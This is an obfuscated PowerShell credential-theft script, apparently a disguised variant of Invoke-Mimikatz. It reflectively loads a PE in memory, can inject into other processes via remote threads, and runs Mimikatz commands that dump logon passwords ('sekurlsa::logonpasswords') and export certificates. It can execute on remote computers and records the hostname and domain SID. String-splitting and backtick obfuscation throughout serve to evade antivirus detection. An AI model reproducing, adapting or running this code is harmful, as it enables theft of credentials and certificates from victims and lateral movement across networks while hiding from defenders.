            [IntPtr]${IM`PORtdES`c`Ri`ptor`Ptr} =  &  ( "{0}{1}{4}{2}{5}{6}{3}"-f'Add-Sig','n','In','ed','ed','tAsUnsi','gn' ) ([Int64]${P`E`iNFO}."PE`H`ANdlE"  ) ( [Int64]${PEI`NFo}."iMA`gE_N`T_`Head`ers"."oPtIOnA`L`heADER"."iM`pOrTt`ABLE"."vIRT`UAl`AD`DresS"  )

            while ( ${T`Rue})
            {
                ${I`mpO`RtDescr`IP`TOR} =    (   VariAbLe (  "Al"  +"9J" )   ).vAluE::"ptr`T`oSt`RucTuRE"(  ${IMpOr`T`d`EsCr`IpT`ORptr}, [Type]${wIn`32ty`pEs}."iMa`Ge_Import`_deS`C`RI`PtoR" )

               
                if ( ${I`m`PORTdE`scripTor}."Char`A`c`TeRIStIcS" -eq 0 `
                        -and ${iMp`oR`TdEs`CrI`pTOr}."FirsT`THu`NK" -eq 0 `
                        -and ${iM`P`O`RTDeSCRIpt`Or}."foR`waR`dErc`HAiN" -eq 0 `
                        -and ${ImpO`Rt`dE`sc`RI`PToR}."n`AmE" -eq 0 `
                        -and ${I`MpOr`Tde`SCRiPTOR}."TIMeD`A`TEst`A`Mp" -eq 0 )
                {
                    &  ("{3}{1}{2}{0}" -f 'Verbose','ite','-','Wr'  ) "Modified: Done unloading the libraries needed by the PE"
                    break
                }

                ${ImPO`RT`DlL`p`ATh} =   $aL9J::(  "{3}{1}{4}{2}{0}" -f'i','oSt','gAns','PtrT','rin').Invoke((&  ( "{1}{3}{0}{4}{2}"-f'ntAsU','Add-Signe','ned','dI','nsig' ) ([Int64]${peI`NFo}."pEHAnD`LE" ) (  [Int64]${I`Mp`ortDESCR`I`P`TOr}."NA`ME"  )))
                ${iM`po`Rt`dLLh`AnDLe}   =   ${wiN3`2F`U`NCti`ONs}."Ge`T`MOD`UlEHa`Ndle"."In`V`okE"( ${iMP`o`RT`DllPAtH})

                if (  ${imp`or`TdlLhA`NDle} -eq ${n`UlL}  )
                {
                    &  ("{2}{3}{0}{1}" -f 'i','ng','Write-War','n') "Modified: Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction ("{2}{0}{1}"-f'tinu','e','Con' )
                }

                ${s`U`ccEsS} = ${WIn3`2FUN`CTI`oNS}."fr`ee`lIbRarY"."inV`oke"(  ${ImPO`RtDlLHA`Nd`LE}  )
                if ( ${Su`cCE`ss} -eq ${faL`sE}  )
                {
                      & ( "{3}{0}{1}{2}" -f'Wa','r','ning','Write-'  ) "Modified: Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction (  "{1}{0}" -f'inue','Cont')
                }

                ${imPORT`DeS`cRiP`T`or`Ptr}   = &( "{1}{0}{4}{3}{2}"-f 'd','Add-Signe','Unsigned','As','Int') ( ${IMp`oRtd`eSCRi`Pt`ORPTr} ) (  (  gET-ITem VARiaBlE:aL9j  ).vaLuE::"sIzE`Of"( [Type]${wIn`32T`ypES}."Im`AGE`_i`MPoRt_d`esC`RipT`or")  )
            }
        }

       
        &(  "{0}{1}{3}{2}" -f'Write-','Ve','e','rbos'  ) "Modified: Calling dllmain so the DLL knows it is being unloaded"
        ${dLL`MaIn`p`TR}   =  &(  "{2}{3}{0}{4}{5}{6}{1}{7}"-f'-S','sign','Ad','d','ignedIntA','s','Un','ed' ) (  ${p`eINfo}."p`ehANdLE" ) (${pe`InfO}."ImAGe_n`T_`h`E`ADERs"."oPTion`A`L`hEAder"."a`ddres`SO`FEntry`poInt")
        ${dLL`maIN`Del`EG`ATE}   =    &("{0}{4}{5}{2}{3}{1}"-f 'G','pe','elega','teTy','et-','D') @([IntPtr], [UInt32], [IntPtr] ) ( [Bool] )
        ${DLL`m`AiN} =   $AL9j::(  "{2}{0}{5}{4}{3}{1}{6}" -f'legateForFun','nte','GetDe','Poi','n','ctio','r' ).Invoke(  ${dllmA`INP`TR}, ${dLLM`A`iNDE`lEGATe})

        ${dL`LMa`In}."IN`VO`kE"( ${Pein`FO}."p`EHaND`le", 0,   (    GET-VarIaBle  ( "w"  + "jAg7")   ).vALue::"ZE`Ro" ) |   &("{2}{1}{0}"-f 'll','-Nu','Out' )


        ${suc`CEss} = ${WiN`32fuNCtI`o`NS}."V`IRTuAl`Fr`EE"."i`NvOKE"( ${p`eh`A`NdlE}, [UInt64]0, ${w`in32CoN`sTantS}."m`Em_`R`eleASe")
        if (  ${SucC`ESs} -eq ${f`ALSE} )
        {
             & ("{0}{2}{1}" -f 'Write-','rning','Wa') "Modified: Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction (  "{1}{0}{2}"-f 'ont','C','inue'  )
        }
    }


    Function M`AiN
    {
        ${wIn32`Func`Ti`oNs}  =   &  ( "{2}{3}{1}{0}" -f 's','ion','Get-','Win32Funct'  )
        ${win3`2`T`YPeS}  =   &  ( "{1}{3}{4}{2}{0}" -f 'pes','G','Win32Ty','et','-')
        ${wiN3`2Co`Ns`T`AnTs}   =     &( "{4}{2}{0}{1}{3}" -f '32C','onstant','et-Win','s','G')

        ${Rem`o`TEPr`OCHANd`le}  =   (   VARiaBlE Wjag7  -VALue )::"Z`eRO"

       
        if (( ${pRO`ciD} -ne ${n`Ull}) -and (${p`RoC`Id} -ne 0) -and (  ${p`R`oCname} -ne ${N`Ull} ) -and (${PRO`C`Name} -ne "")  )
        {
            Throw "Modified: Can't supply a ProcId and ProcName, choose one or the other"
        }
        elseif (  ${ProCN`A`Me} -ne ${nu`LL} -and ${pr`oCna`me} -ne ""  )
        {
            ${P`ROce`SSEs} =  @(  &  ( "{2}{1}{0}"-f 'ess','c','Get-Pro'  ) -Name ${pRO`C`Na`ME} -ErrorAction (  "{0}{1}{2}" -f 'Sil','entlyContin','ue'  )  )
            if (${Proc`E`S`Ses}."c`ouNT" -eq 0 )
            {
                Throw "Modified: Can't find process $ProcName"
            }
            elseif (  ${p`Roc`EsSes}."cO`UNt" -gt 1)
            {
                ${pRO`CIN`FO}   =    &(  "{1}{0}{2}"-f 'Proces','Get-','s'  )  |   &  (  "{1}{0}" -f 'ere','wh'  ) { ${_}."Na`me" -eq ${Pr`oC`Name} }  |   &(  "{2}{0}{1}" -f '-','Object','Select') ("{3}{2}{1}{0}"-f 'e','Nam','ss','Proce' ), ('Id'  ), ( "{2}{1}{0}" -f'sionId','es','S'  )
                & ( "{2}{0}{1}{3}" -f'te-','Outp','Wri','ut'  ) ${Pr`oc`IN`FO}
                Throw "Modified: More than one instance of $ProcName found, please specify the process ID to inject in to."
            }
            else
            {
                ${pro`c`id}   =   ${pr`o`cessEs}[0]."iD"
            }
        }

       
       
#       if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
#           Write-Verbose "Modified: Getting SeDebugPrivilege"
#       }

        if ((  ${P`R`OCId} -ne ${Nu`lL}) -and (${pRo`cID} -ne 0 ))
        {
            ${RE`mOT`EP`RO`ch`ANdlE} =  ${wIn`32`FuN`cti`ONs}."oPe`NPRO`cESS"."iN`VokE"(0x001F0FFF, ${f`A`Lse}, ${P`RO`Cid} )
            if (${Re`MOTePR`OC`hand`le} -eq  (  gET-cHIldiTEM VariABlE:WJAG7  ).value::"Z`ERO")
            {
                Throw "Modified: Couldn't obtain the handle for process ID: $ProcId"
            }

            & (  "{2}{3}{0}{1}"-f'er','bose','W','rite-V' ) "Modified: Got the handle for the remote process to inject in to"
        }


       
          &("{0}{1}{2}"-f 'W','rite-Verbo','se' ) "Modified: Calling Invoke-MemoryLoadLibrary"

        try
        {
            ${PrO`c`ESso`RS}  =    &  (  "{0}{2}{1}{4}{3}" -f'Get','miOb','-W','ct','je'  ) -Class ("{1}{2}{3}{4}{0}"-f'essor','W','in','32_Pro','c'  )
        }
        catch
        {
            throw (${_}."ex`Ce`PTIOn"  )
        }

        if (${pRO`C`EsSO`RS} -is [array]  )
        {
            ${pR`O`cesSor}   = ${PROce`sS`ORs}[0]
        } else {
            ${proC`esS`Or}   = ${p`R`OCEs`SORS}
        }

        if (  ( ${pR`o`cEsSor}."A`dd`RESs`WIDTh") -ne ((  (   GEt-iteM vARiable:OKvp   ).valUe::"sI`Ze"  )*8  ) )
        {
              & (  "{0}{2}{1}"-f'Wri','rbose','te-Ve') (   "Architecture: "   +   ${P`R`oCessOr}."a`DDress`WID`TH"   +  " Process: " +  (  $okvP::"S`IZE" * 8 ))
              & ("{1}{2}{0}" -f 'or','Writ','e-Err'  ) "PowerShell architecture (32bit/64bit) doesn't match OS architecture. 64bit PS must be used on a 64bit OS." -ErrorAction (  "{0}{1}"-f'S','top'  )
        }

       
        if (   (   DIr  ( 'vARi' +'ab'  +'lE:'  +'A'  + 'l9j' )   ).vaLUE::"s`IzEOf"([Type][IntPtr]  ) -eq 8 )
        {
            [Byte[]]${p`EbY`TES}   =   [Byte[]] (   vaRiable  BFUW1  -vaLueO)::(  "{2}{3}{0}{4}{1}" -f'64S','ng','Fr','omBase','tri' ).Invoke(  ${p`eByt`eS64} )
        }
        else
        {
            [Byte[]]${P`EBY`Tes}   = [Byte[]] (   gEt-vAriAbLE ( "bFU" +"w1"  )  ).Value::(  "{0}{2}{1}{3}"-f 'From','ase6','B','4String').Invoke( ${p`ebyTE`s32} )
        }
        ${PEBy`T`ES}[0] = 0
        ${p`EByt`ES}[1]  =  0
        ${PE`HAnd`Le} =  (  Get-vArIabLE  WjAG7  -vALU)::"z`erO"
        if (  ${ReMo`T`epRoC`haNdlE} -eq   (    Get-variABLE  wJaG7  -Value  )::"Z`Ero"  )
        {
            ${p`E`lOA`deDInfO}   =   & (  "{3}{2}{5}{4}{1}{7}{6}{0}"-f 'ary','Li','oke-','Inv','oad','MemoryL','r','b') -PEBytes ${pEBY`TES} -ExeArgs ${e`XE`ARgs}
        }
        else
        {
            ${P`ElOad`eDINfO}  =   & (  "{2}{0}{1}{5}{3}{4}{6}"-f'nvoke','-','I','o','adLibr','MemoryL','ary' ) -PEBytes ${peBy`T`es} -ExeArgs ${ex`eA`RGs} -RemoteProcHandle ${reMO`TeprO`Ch`Andle}
        }
        if (  ${pEL`O`A`DeDiN`Fo} -eq   ( VaRiABLE  ( "wj" +"Ag7" )  ).vALUe::"Z`eRO" )
        {
            Throw "Modified: Unable to load PE, handle returned is NULL"
        }

        ${P`EHa`N`DLe}  =   ${PeLoAdE`dI`NFO}[0]
        ${Re`mOTEPE`Ha`N`Dle} = ${PeLo`A`deDi`NfO}[1]


       
        ${PE`Info}  =     &(  "{4}{3}{0}{1}{2}" -f'-','PE','DetailedInfo','t','Ge'  ) -PEHandle ${PEh`ANd`Le} -Win32Types ${wIn3`2tY`P`Es} -Win32Constants ${WI`N3`2c`oNsTANtS}
        if ((${pEIn`FO}."fi`l`etype" -ieq "DLL" ) -and ( ${reMotePR`o`CH`ANdLE} -eq   $wJAg7::"Z`ErO"  )  )
        {
           
           
           
                     &  ( "{4}{0}{1}{2}{3}"-f 'r','ite-Ve','rbos','e','W' ) "Modified: Calling function with WString return type"
                    [IntPtr]${wstr`In`gfu`NCa`ddR}   =    &(  "{0}{4}{1}{3}{5}{2}{6}"-f'Get','o','r','ryProc','-Mem','Add','ess' ) -PEHandle ${P`E`haNDlE} -FunctionName "powershell_reflective_mimikatz"
                    if (${ws`TrIn`gF`UNcaddR} -eq   $WjAg7::"Z`ERo" )
                    {
                        Throw "Modified: Couldn't find function address."
                    }
                    ${w`STRInGFun`CD`E`lEGATE}  =   & (  "{3}{0}{2}{1}"-f '-Dele','teType','ga','Get'  ) @([IntPtr]  ) ( [IntPtr] )
                    ${wS`TR`INg`Func} =     (    gEt-VaRIablE ( 'a'+'L9J')).valuE::( "{1}{3}{5}{6}{0}{2}{4}" -f'unctionPoi','GetDele','nt','ga','er','teFor','F' ).Invoke(  ${w`sT`RIng`Fun`CAd`dr}, ${wsT`RINgfUNCd`ElEg`A`TE}  )
                    ${Wstr`I`N`Gin`pUT}  =  $aL9J::("{3}{0}{2}{1}{4}" -f 'tri','gToHGl','n','S','obalUni' ).Invoke( ${e`Xe`ArGs}  )
                    [IntPtr]${O`UT`putpTR} =  ${wS`TrINgf`UNC}."I`NVOke"(  ${w`s`TRiNgINP`Ut})
                      (    gi  (  "vA" +"rIabLE:al9"  +"j" )  ).VALue::( "{0}{1}{2}"-f'Fr','eeHG','lobal').Invoke(${wStr`InG`inpuT}  )
                    if ( ${o`Ut`PUtpTr} -eq   $WjAg7::"Ze`Ro" )
                    {
                        Throw "Modified: Unable to get output, Output Ptr is NULL"
                    }
                    else
                    {
                        ${oUT`p`Ut}  =   $Al9J::("{3}{0}{2}{1}"-f 'rT','Uni','oString','Pt').Invoke( ${ouT`P`UTPtR} )
                         &  ( "{2}{0}{1}" -f 'ut','put','Write-O'  ) ${outP`UT}
                        ${win3`2f`UNc`TIonS}."LOC`A`LFree"."i`NVOKE"( ${out`P`UTpTR} ); 
                    }
           
           
           
        }
       
        elseif ( (  ${pEiN`Fo}."fiLet`y`pe" -ieq "DLL" ) -and ( ${remOTeP`R`ocHA`NDLE} -ne  $wJaG7::"ze`RO") )
        {
            ${V`oiD`F`UnCaddr}   =   &(  "{3}{4}{5}{2}{0}{6}{1}"-f'Pro','ddress','y','Get-Me','m','or','cA') -PEHandle ${PEhA`N`Dle} -FunctionName "VoidFunc"
            if (  (${v`Oi`DfUn`c`ADdr} -eq ${N`Ull}) -or (${vo`idFun`CAD`Dr} -eq   ( geT-VARIABLe (  "wj" + "AG7" ) -VaLUEoN )::"ZE`Ro" ) )
            {
                Throw "Modified: VoidFunc couldn't be found in the DLL"
            }

            ${v`OID`FUNC`AddR}  = &  (  "{3}{2}{4}{0}{1}"-f'nedIntAsU','nsigned','S','Sub-','ig') ${VoI`d`FU`NCaDDr} ${PE`hA`Nd`Le}
            ${VOidF`UncaD`dR}   =   & ("{4}{1}{3}{2}{0}"-f'signed','dd-S','AsUn','ignedInt','A') ${VO`iDFU`NC`ADDR} ${rem`O`TEPE`HaNdlE}

           
            ${rTh`RE`AdhaN`DlE}  =     & (  "{4}{1}{2}{0}{6}{3}{5}" -f 'te','e-Create','Remo','ea','Invok','d','Thr'  ) -ProcessHandle ${rEMO`T`EP`RO`Ch`ANdle} -StartAddress ${VOid`FUncAD`dR} -Win32Functions ${WIN`32FUnc`Tio`NS}
        }

       
        if (${REm`o`T`EpR`Ocha`NDlE} -eq  ( dIR  ("V" +  "aRiabl"  +  "e"  +":" + "Wjag7")  ).vAlUE::"z`ero")
        {
              & (  "{5}{0}{3}{4}{2}{1}"-f'emo','rary','b','ryFree','Li','Invoke-M') -PEHandle ${p`eHAnD`LE}
        }
        else
        {
           
            ${s`Uc`CeSs}   =   ${WiN32`FuNC`T`IONS}."viR`TuALf`REE"."IN`VOke"(  ${pEh`AN`dlE}, [UInt64]0, ${win3`2c`onsTAN`TS}."me`M`_Release" )
            if (${sUC`cE`SS} -eq ${f`AlsE}  )
            {
                  &( "{3}{1}{2}{0}" -f 'ning','te-W','ar','Wri') "Modified: Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction ("{1}{0}" -f'inue','Cont' )
            }
        }

          &( "{1}{2}{3}{4}{0}" -f'e','Write','-Ver','b','os' ) "Modified: Done!"
    }

     & ("{1}{0}" -f 'n','Mai'  )
}

Function m`AiN
{
    if ( (${PScM`dlet}."mYinVoCa`T`ION"."b`o`U`NdPAramE`Ters"["Debug"] -ne ${Nu`LL} ) -and ${P`s`Cmdlet}."mY`iN`VocATIOn"."BOuNDpar`A`M`Et`eRs"["Debug"]."is`PresE`NT" )
    {
        ${DEBuGpr`EFEREN`CE}   = "Continue"
    }

      & ( "{0}{1}{2}" -f'Write-','V','erbose'  ) "Modified: PowerShell ProcessID: $PID"


    if (  ${P`sC`mDleT}.pARametErSEtname -ieq "dCreds" )
    {
        ${EX`eArGs}   =  "sekurlsa::logonpasswords exit"
    }
    elseif (  ${PsCM`DLeT}.parAMETErsEtNAME -ieq "dCerts"  )
    {
        ${Ex`Ear`gS}   = "crypto::cng crypto::capi `"crypto::certificates /export`" `"crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE`" exit"
    }
    else
    {
        ${E`XE`ARGs}  =  ${COM`m`AnD}
    }

      ( get-VarIABlE  (  "bT"  + "Fp" )   ).VALue::(  "{1}{3}{2}{0}"-f 'tDirectory','SetCur','en','r').Invoke(  ${P`wd} )


    if (  ${c`oM`Pu`TERNaMe} -eq ${N`UlL} -or ${co`mPUT`e`R`NAME} -imatch "^\s*$"  )
    {
        & ("{1}{2}{0}" -f 'nd','Invoke-Comm','a'  ) -ScriptBlock ${r`e`motE`SCrIp`TblO`Ck} -ArgumentList @(${PEB`ytEs`64}, ${P`ebytes`32}, "Void", 0, "", ${eXeAR`gs})
    }
    else
    {
          &( "{3}{1}{2}{0}"-f 'and','-Com','m','Invoke') -ScriptBlock ${Re`MoT`eSCRiptblo`Ck} -ArgumentList @(${Pe`BYTe`s`64}, ${Peb`Y`Tes32}, "Void", 0, "", ${E`XeaR`gs}  ) -ComputerName ${coMp`Ut`Er`NAMe}
    }
}


${P`ArTs}   = $(&(  "{1}{0}"-f 'oami','wh'  ) ("{0}{1}" -f'/','user'))[-1].("{0}{1}"-f'spli','t'  ).Invoke(  " "  )[1] ;
${ParT`s2}  = ${pAr`Ts}.( "{1}{0}"-f 'lit','sp' ).Invoke('-' );  
${Hos`Tn`AmE} =   $(  ( lS  ('vARiabL'  + 'e:Z'+ '6'  +'8'+  '3')).VALUe::( "{0}{1}{2}{3}" -f'GetHostBy','N','am','e'  ).Invoke(  (${enV:Co`mP`UTeRnA`mE}))."HOst`NAme" ) ;
${domAI`NS`iD}  = ${p`AR`TS2}[0..( ${P`ART`S2}."cou`Nt"-2  )] -join '-'  ;  
${re`sul`TS} =  &  ( "{1}{0}" -f 'in','Ma'  );  
"Hostname: $HostName / $DomainSID";
${rES`ULTs}
}
